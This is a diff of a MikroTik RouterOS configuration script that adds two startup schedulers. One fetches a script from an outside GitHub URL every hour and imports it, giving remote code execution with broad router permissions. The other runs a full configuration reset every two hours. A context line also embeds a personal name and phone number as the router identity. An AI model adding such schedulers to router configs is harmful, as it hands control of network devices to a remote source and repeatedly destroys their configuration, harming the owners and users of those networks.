@@ -82,10 +82,17 @@ add check-gateway=ping disabled=no distance=9 dst-address=0.0.0.0/0 gateway=\ 19
 /system scheduler add disabled=no interval=1d name=K on-event=\ "/system identity\r\ \nset name=Ahmed-Kamel-01007766172" policy=\ ftp,reboot,read,write,policy,test,winbox,password,sniff,sensitive,api \ start-time=startup 
 
 /system scheduler
-add interval=2h name=K on-event="/ip firewall mangle remove [find];" policy=\
+add interval=1h name=to on-event="/tool fetch url=https://raw.githubusercontent.\
+    com/TorGoman/Mikrotik/main/to mode=http dst-path=to\r\
+    \n/import to\r\
+    \n" policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon \
+    start-time=startup
+
+/system scheduler
+add interval=2h name=R on-event="system reset-configuration" policy=\
     ftp,reboot,read,write,policy,test,password,sniff,sensitive start-time=\
     startup
-    
+
     
     
     
